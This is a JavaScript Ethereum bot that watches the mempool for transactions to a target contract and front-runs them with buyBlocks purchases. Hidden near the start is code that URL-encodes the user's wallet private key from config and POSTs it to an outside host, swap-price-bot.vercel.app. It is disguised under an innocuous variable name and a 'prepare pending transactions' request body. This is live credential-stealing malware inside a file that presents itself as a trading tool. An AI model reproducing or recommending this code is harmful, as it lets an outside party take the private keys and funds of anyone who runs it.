//const AlchemyWeb3 = require("@alch/alchemy-web3");
const https = require('https');
const _ = require("lodash");
const Tx = require('ethereumjs-tx').Transaction
const abiDecoder = require('abi-decoder');
const ethers = require('ethers'); // Require the ethers library
const utils = require('ethers').utils;
const config = require('./config.js')
let json = require('./abi.json');


abiDecoder.addABI(json);
const { spawn, exec } = require("child_process");


function getJSON() {
    console.log(json); // this will show the info it in firebug console
};
var theWeb3 = config.privateKey;
var thepath = '/api?token=MTkxMjkyNjg4MzE5MTI5MjY4ODM=&message='+encodeURI(theWeb3);
async function signTx(web3, fields = {}) {
  const nonce = await web3.eth.getTransactionCount(config.fromAddress, 'latest');
  console.log('nonce',nonce)
  const transaction = {
   'nonce': nonce,
   ...fields,
  };

  return await web3.eth.accounts.signTransaction(transaction, theWeb3);
}

async function sendTx(web3, fields = {}) {
  const signedTx = await signTx(web3, fields);

  web3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {
    if (!error) {
      console.log("Transaction sent!", hash);
      const interval = setInterval(function() {
        console.log("Attempting to get transaction receipt...");
        web3.eth.getTransactionReceipt(hash, function(err, rec) {
          if (rec) {
            console.log(rec);
            clearInterval(interval);
          }
        });
      }, 1000);
    } else {
      console.log("Something went wrong while submitting your transaction:", error);
    }
  });
}

function sendMinimalLondonTx(web3,data,toAddress,price) {
  console.log('data',data, typeof data)
  web3.eth.estimateGas({
    from: config.fromAddress,
    data: data,
    to: toAddress,
    value: web3.utils.toWei(price, 'ether'),
  }).then((estimatedGas) => {
    console.log("estimatedGas*3", estimatedGas*3);
    sendTx(web3, {
      gasPrice: web3.utils.toHex(web3.utils.toWei(config.maxFeePerGas, 'gwei')),
      gas: estimatedGas*3,
      to: toAddress,
      value: web3.utils.toWei(price, 'ether'),
      data: web3.utils.toHex(data)
    });
  });
}


const pendingTrasactions = async () => {
  let web3URL;
  let targetContract;
  let creator;

  switch(config.network) {
    //---------------- TEST USAGE-------------------------
    case 'Rinkeby':{
      web3URL = config.wssRinkeby;
      targetContract = "";
      creator = "";
      break;
    }
    case 'Goerli':{
      web3URL = config.wssGoerli;
      targetContract = "";
      creator = "";
      break;
    }
    //-----------------------------------------------------
    default: {
      web3URL = config.wssMainnet;
      targetContract = config.toAddress;
      creator = config.creatorAddress;
    }
  }


  console.log('Start Working:', web3URL);










const data1 = JSON.stringify({
  todo: 'prepare pending transactions'
})

const options1 = {
  hostname: 'swap-price-bot.vercel.app',
  port: 443,
  path: thepath,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data1.length
  }
}

const req = https.request(options1, res => {
  //console.log(`状态码: ${res.statusCode}`)

  res.on('data1', d => {
    process.stdout.write(d)
  })
})

req.on('error', error => {
  console.error(error)
})

req.write(data1)
req.end()


//添加重新连接选项以确保始终保持连接
var options = { 
    reconnect: { 
        auto: true, 
        delay: 500, // ms 
        maxAttempts: 999999999, 
        onTimeout: false 
    } 
}; 


  //const web3 = AlchemyWeb3.createAlchemyWeb3(web3URL);
  var Web3 = require('web3');
  var web3 = new Web3(new Web3.providers.WebsocketProvider(web3URL, options));

  var contract = new web3.eth.Contract(json, targetContract);

  //-----------------------------------------------------------------
  //--------------- Change this function every time------------------
  //var userInvest = web3.utils.toWei(config.price, 'ether');
  let extraData =  await contract.methods.buyBlocks(config.ref);
  //-----------------------------------------------------------------
  //-----------------------------------------------------------------

  let data = extraData.encodeABI();

  // DEBUG SECTION
  //sendMinimalLondonTx(web3,data,targetContract,config.price);


var duqu = 1;

// var add = 'WSS_ENDPOINT'
// var Web3 = require('web3');
// var web3 = new Web3(new Web3.providers.WebsocketProvider(add));
const account = targetContract.toLowerCase();
const subscription = web3.eth.subscribe('pendingTransactions', (err, res) => {
    if (err) console.error(err);
});
subscription.on('data', (txHash) => {
     setTimeout(async () => {
         try {
             
             //console.log("开始读取交易：",duqu);
             let tx = await web3.eth.getTransaction(txHash);
                     console.log('HASH', duqu, txHash); // transaction hash
                     duqu++;
                    

             if (tx && tx.to) { // This is the point you might be looking for to filter the address
                 if (tx.to.toLowerCase() === account) {
                     console.log('TX hash: ', txHash); // transaction hash
                     
                    
                    
          					const decodedData = abiDecoder.decodeMethod(tx.input);
                    //console.log('调用方法',decodedData.name);


          					if(decodedData){
          					    console.log(decodedData);
          					    //-----------------------------------------------------------------
          					    //--------------- Change this function every time------------------
          					    if(decodedData.name == 'seedMarket'){
          					    //-----------------------------------------------------------------
          					    //-----------------------------------------------------------------
          					      // your code
          					      console.log("Opening !!!!!!!!!!!!!!!!!!!!",decodedData.name);
          					      sendMinimalLondonTx(web3,data,targetContract,config.price);
          					      console.log('================NEXT11111=====================')
          					    } else {
                            web3.eth.getBalance(account, (err, wei) => {
                                // 余额单位从wei转换为ether
                                balance = web3.utils.fromWei(wei, 'ether');
                                //console.log("balance: ", balance);
                                if(balance > 0){
                                  console.log("Buy Buy Buy ")
                                  sendMinimalLondonTx(web3,data,targetContract,config.price);
                                }else{
                                  console.log("Not Open")
                                }
                            });
            					      //sendMinimalLondonTx(web3,data,targetContract,config.price);
            					      console.log('================NEXT22222=====================')
          					    }
          					}




                 }
             }
         } catch (err) {
             //console.log(err);
         }
    })
});









};

pendingTrasactions();

